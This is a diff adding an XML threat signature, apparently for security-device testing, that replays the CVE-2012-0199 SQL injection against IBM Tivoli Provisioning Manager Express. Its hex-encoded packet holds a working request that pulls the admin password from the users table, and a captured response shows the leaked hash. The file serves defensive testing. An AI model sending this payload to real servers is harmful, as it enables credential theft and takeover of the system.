@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Tivoli Provisioning Manager Express Asset.getMimeType SQL Injection"/>
+    <EngDesc display="true" value="An SQL injection vulnerability exists in IBM Tivoli Provisioning Manager Express. The vulnerability is due to insufficient input sanitation in the Asset.getMimeType function when processing HTTP requests sent to the getAttachment servlet.            A remote attacker can exploit this SQL injection vulnerability to read data from the database including the SHA1 encrypted admin password, and then upload file to the server and execute code under the context of the SYSTEM user.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="SQL_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Tivoli_Provisioning_Manager_Express_for_Software_Distribution"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="V4.1.x_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20120301-10"/>
+    <CVEID display="true" value="CVE-2012-0199"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="878b33b7ba07c961e4cd5daa19a8e66d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634684434799127550"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1333099839" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:CB:7A:0A" destMac="00:0C:29:D8:6D:52" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02E4" Identification="0064" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="8E23" srcIP="172.16.8.221" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1058" destPort="$HTTPdestPort" SeqNumber="F2F8F9A1" AckNumber="B87429DD" HeaderLength="05" WindowSize="FFFF" Checksum="844F" UrgentPointer="0000" Options="" Payload="474554202F74706D782F6765744174746163686D656E743F68774B65793D31267265766573696F6E3D312666696C65547970653D4154544143484D454E542666696C654E616D653D66696C6527253230756E696F6E25323073656C65637425323070617373776F726425323066726F6D253230253234253233534348454D412E757365727325323077686572652532307573657269643D2761646D696E20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F6A7065672C20696D6167652F706A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C206170706C69636174696F6E2F782D6D732D6170706C69636174696F6E2C206170706C69636174696F6E2F782D6D732D786261702C206170706C69636174696F6E2F766E642E6D732D787073646F63756D656E742C206170706C69636174696F6E2F78616D6C2B786D6C2C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520382E303B2057696E646F7773204E5420352E313B2054726964656E742F342E303B20496E666F506174682E323B202E4E455420434C5220322E302E35303732373B202E4E455420434C5220332E302E343530362E323135323B202E4E455420434C5220332E352E3330373239290D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A486F73743A203137322E31362E382E3134330D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:D8:6D:52" destMac="00:0C:29:CB:7A:0A" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0183" Identification="5A13" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="35D5" srcIP="$destIP" destIP="172.16.8.221" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1058" SeqNumber="B87429DD" AckNumber="F2F8FC5D" HeaderLength="05" WindowSize="FD43" Checksum="06B7" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A436F6E74656E742D547970653A20323839316261636565656631363532656536393832393464613065373162613738613261343036340D0A436F6E74656E742D446973706F736974696F6E3A206174746163686D656E743B2066696C656E616D653D66696C652720756E696F6E2073656C6563742070617373776F72642066726F6D202423534348454D412E7573657273207768657265207573657269643D2761646D696E0D0A436F6E74656E742D4C656E6774683A20300D0A436F6E74656E742D4C616E67756167653A20656E2D55530D0A5365727665723A20576562537068657265204170706C69636174696F6E205365727665722F362E300D0A446174653A204672692C203233204D617220323031322031333A33373A323420474D540D0A436F6E74656E742D4465736372697074696F6E3A204174746163686D656E7420446174610D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
